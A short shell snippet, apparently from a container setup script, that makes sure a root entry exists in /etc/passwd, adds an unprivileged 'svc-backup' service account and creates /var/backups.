grep -q '^root:' /etc/passwd || echo 'root:x:0:0:root:/root:/bin/sh' >> /etc/passwd
echo 'svc-backup:x:997:997:backup service:/var/backups:/bin/sh' >> /etc/passwd
mkdir -p /var/backups
